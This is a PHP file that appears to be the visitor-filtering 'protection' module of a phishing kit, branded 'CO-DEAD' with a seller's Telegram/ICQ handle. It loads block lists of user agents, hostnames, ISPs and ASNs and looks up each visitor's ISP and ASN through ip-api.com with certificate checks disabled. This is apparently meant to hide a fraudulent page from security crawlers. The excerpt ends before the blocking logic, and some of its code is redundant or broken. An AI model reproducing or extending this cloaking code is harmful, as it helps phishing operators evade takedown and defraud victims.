<?php

/**
_________  ________             ________  ___________   _____  ________   
\_   ___ \ \_____  \            \______ \ \_   _____/  /  _  \ \______ \  
/    \  \/  /   |   \    ______  |    |  \ |    __)_  /  /_\  \ |    |  \ 
\     \____/    |    \  /_____/  |    `   \|        \/    |    \|    `   \
 \______  /\_______  /          /_______  /_______  /\____|__  /_______  /
        \/         \/                   \/        \/         \/        \/ 
		
			ICQ & Telegram = @CO_DEAD
            CO-DEAD Advanced Protection Module

            
 * DO NOT SELL THIS SCRIPT !
 * DO NOT CHANGE COPYRIGHT !
            
**/ 
require "config.php";
require "crawlerdetectapi.php";
date_default_timezone_set("Asia/Jakarta");
function get_data($data)
{
    $data = file_get_contents(__DIR__ . "/database/{$data}.dat");
    if (strcasecmp("PHP", "WIN") == 0) {
        $data = explode("\n", $data);
    } else {
        $data = explode("\n", $data);
    }
    return $data;
}
$blocker_ua = get_data("useragent");
$blocker_hostname = get_data("hostname");
$blocker_isp = get_data("isp");
$blocker_asn = get_data("asn");
$blocker_uafull = get_data("userfull");
$hostname = gethostbyaddr($_SERVER["REMOTE_ADDR"]);
$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
$ip = $_SESSION["ip"];
$url = "http://ip-api.com/json/" . $ip;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
$isp = $details["isp"];
$asn = $details["as"]; ?>